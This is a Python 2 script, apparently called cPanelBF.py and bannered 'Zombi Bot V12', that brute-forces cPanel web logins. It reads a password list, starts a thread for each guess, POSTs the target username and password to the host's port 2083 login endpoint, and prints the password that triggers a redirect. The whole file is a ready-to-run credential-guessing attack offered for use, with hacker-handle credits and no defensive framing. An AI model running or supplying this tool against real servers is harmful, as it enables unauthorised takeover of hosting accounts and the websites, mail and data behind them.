#!/usr/bin/env python

import argparse
import urllib, urllib2
import re, time
import cookielib
import sys, os
import threading
import socket


def clear():
	
	if os.name == "nt":
		os.system('cls')
	else:
		os.system('clear')

clear()

logo = """
  ______               _     _   ____        _    __      ____ ___  
 |___  /              | |   (_) |  _ \      | |   \ \    / /_ |__ \ 
    / / ___  _ __ ___ | |__  _  | |_) | ___ | |_   \ \  / / | |  ) |
   / / / _ \| '_ ` _ \| '_ \| | |  _ < / _ \| __|   \ \/ /  | | / / 
  / /_| (_) | | | | | | |_) | | | |_) | (_) | |_     \  /   | |/ /_ 
 /_____\___/|_| |_| |_|_.__/|_| |____/ \___/ \__|     \/    |_|____|                                                                      
 Zombi Bot V12    |   Ultra Priv8 Bot    | |  Code by Viper1337 


"""

print logo


if __name__ == "__main__":

	if len(sys.argv) == 1:
		print '''usage: cPanelBF.py [-h] [--host HOST] [--user USER] [--password PASSWORD]

optional arguments:
  -h, --help           show this help message and exit
                       As per cPanel rule First 8 characters are username. But it not compulsory
  --host HOST          Insert Target IP-Address
  --user USER          Insert UserName
  --password PASSWORD  Insert Password List'''
		sys.exit()

	parser = argparse.ArgumentParser()
	parser.add_argument('--host', help="Insert Target IP-Address")
	parser.add_argument('--user', help="Insert UserName")
	parser.add_argument('--password', help="Insert Password List")
	args = parser.parse_args()

if args.host.startswith("http://"):
	print "[~] Insert URL with out HTTP "
	print "Coded By Ne0-h4ck3r"
	print ""
	sys.exit(1)

elif args.host.startswith("https://"):
	print "[~] Insert URL with out HTTPs "
	print "Coded By Ne0-h4ck3r"
	print ""
	sys.exit(1)

else:
	pass

def cPanel(passwd, pwd, coder):

	try:
		
		args.host = socket.gethostbyname(args.host)

		post = {}
		post['user'] = args.user
		post['pass'] = passwd
		
		cpURL = "https://"+args.host+":2083/login/?login_only=1"	
		neo = urllib2.Request(cpURL, urllib.urlencode(post))
		cp = coder.open(neo).read()

		if 'redirect' in cp:
			t2 = time.time()
			print ""
			print "[+] Your Domain: %s" % args.host
			print "[+] UserName: %s" % args.user
			print "[+] Password: %s" % passwd
			print "[+] Time: %s" % str(t2-t1)
			print ""
			os._exit(1)

	except socket.gaierror:
		print ""
		print "Please Insert Valid IP / HostName "
		print ""
		os._exit(1)

	except Exception, e:
		pass

threads = []

with open(args.password, 'r') as f:
	pwd = f.read().splitlines()

cj = cookielib.CookieJar()
coder = urllib2.build_opener(urllib2.HTTPCookieProcessor(cj))

for passwd in pwd:
	t1 = time.time()
	t = threading.Thread(target=cPanel, args=(passwd, pwd, coder))
	t.start()
	threads.append(t)
	time.sleep(0.2)

print ""
print "[-] Failed To Find Password "
print ""